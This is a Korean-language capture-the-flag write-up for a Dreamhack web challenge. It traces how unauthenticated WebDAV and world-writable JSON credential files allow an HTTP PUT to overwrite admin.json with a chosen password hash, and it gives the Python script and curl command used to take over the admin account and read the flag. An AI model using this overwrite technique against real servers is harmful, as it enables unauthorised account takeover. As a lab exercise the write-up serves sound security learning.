# B1 · Really Not SQL

### 1. VM에 접속한다

문제 페이지에 접속하면 `Login`과 `Edit Profile` 메뉴가 있다. 관리자 계정으로 로그인한 뒤 FLAG를 확인하는 것이 목표다.\
<img width="1911" height="503" alt="image" src="https://github.com/user-attachments/assets/1d3a32a8-5689-4d84-a9ec-ccc8cc8e770a" />


### 2. 코드 분석 — WebDAV로 관리자 파일을 수정할 수 있는 이유

**① `login.php`는 DB가 아닌 JSON 파일로 로그인 정보를 확인한다.**

```php
$filename = $username . '.json';
$filepath = $userDir . $filename;
$userData = json_decode(file_get_contents($filepath), true);

if ($userData['id'] !== $username) {
    $error = "Error occured";
} else if ($userData['password'] !== hash("sha256", $password)) {
    $error = "Invalid password";
} else {
    $_SESSION['user'] = $username;
    $success = true;
}
```

`admin`으로 로그인하면 `user/admin.json`을 읽고, 입력한 비밀번호의 SHA-256 해시와 파일에 저장된 해시를 비교한다. 따라서 `admin.json`을 수정할 수 있다면 원하는 비밀번호로 로그인할 수 있다.

**② `000-default.conf`에서 `/user/` 디렉터리에 WebDAV가 활성화되어 있다.**

```apache
<Directory /var/www/html/user/>
    DAV On
    Options Indexes
    AllowOverride All
    Require all granted
</Directory>
```

`DAV On`은 WebDAV 기능을 활성화한다. 별도의 인증 제한이 없어 HTTP `PUT` 요청으로 파일을 덮어쓸 수 있다.
<br>
**WebDAV(Web Distributed Authoring and Versioning)**는 HTTP를 이용해서 웹 서버에 있는 파일을 업로드, 수정, 삭제, 관리할 수 있게 해주는 기능
<br>
<br>
<br>
**③ `Dockerfile`에서는 JSON 파일에 쓰기 권한을 부여한다.**

```dockerfile
RUN chmod 777 /var/www/html/user/
RUN chmod 666 /var/www/html/user/*.json

RUN a2enmod dav
RUN a2enmod dav_fs
```

즉, `/user/admin.json`을 HTTP `PUT` 요청으로 덮어써 관리자 비밀번호 해시를 변경하는 것이 핵심이다.

### 3. 관리자 비밀번호가 들어 있는 JSON 파일 생성

비밀번호를 `test1234`로 정하고 SHA-256 해시를 계산해 `admin.json`을 만든다.


```py
import hashlib
import json

password = "test1234"

data = {
    "no": 0,
    "id": "admin",
    "password": hashlib.sha256(password.encode()).hexdigest()
}

with open("admin.json", "w") as f:
    json.dump(data, f)
```

코드를 실행하여 비밀번호를 변경

로그인 코드가 `id`와 `password`를 검사하므로 `id`는 `admin`으로 유지하고 `password`만 알고 있는 비밀번호의 해시로 지정한다.

### 4. HTTP PUT으로 `admin.json` 덮어쓰기

생성한 파일이 있는 위치에서 다음 명령어를 실행한다. 서버 주소와 포트는 실행 중인 VM 주소를 사용한다.

```powershell
curl.exe -i -X PUT -H "Content-Type: application/json" --data-binary "@admin.json" "http://host3.dreamhack.games:15802/user/admin.json"
```

-X PUT : 서버에 파일을 업로드하거나 덮어쓰기

@admin.json : PC에서 만든 파일의 내용을 전송

/user/admin.json : 서버에서 덮어쓸 대상 파일 경로

서버 응답:

```powershell
PS C:\Users\shbj\Desktop> curl.exe -i -X PUT -H "Content-Type: application/json" --data-binary "@admin.json" "http://host3.dreamhack.games:15802/user/admin.json"
HTTP/1.1 204 No Content
Date: Mon, 02 Nov 2026 10:48:17 GMT
Server: Apache/2.4.58 (Ubuntu)
```

`204 No Content`로 PUT 요청이 정상 처리된 것을 확인했다. 서버의 관리자 JSON 파일이 변경된 것이다.

### 5. 관리자 로그인 후 FLAG 확인

`/login.php`에서 다음 계정으로 로그인한다.

```text
User ID: admin
Password: test1234
```

<img width="539" height="371" alt="image" src="https://github.com/user-attachments/assets/49e315ce-fa7b-4231-8fe5-c6036361f506" />


`login.php`가 변경된 비밀번호 해시를 확인하면 서버에 `$_SESSION['user'] = "admin"`이 설정된다.

`flag.php`는 관리자 세션일 때만 FLAG를 출력한다.

```php
if ($_SESSION['user'] !== "admin") {
    http_response_code(403);
} else {
    $file = file_get_contents('/flag');
    echo trim($file);
}
```

로그인 후 `/flag.php`에 접속하면 `DH{...}` 형식의 FLAG를 확인할 수 있다.

<img width="754" height="114" alt="image" src="https://github.com/user-attachments/assets/6a7374ff-2bcc-4367-bc04-092ff12a6ce3" />


**취약점 원인:** 인증 없이 활성화된 WebDAV와 JSON 파일의 쓰기 권한 때문에 HTTP PUT으로 관리자 인증 정보를 덮어쓸 수 있었다. 세션을 직접 변조한 것이 아니라 수정한 비밀번호로 정상 로그인해 관리자 세션을 얻었다.
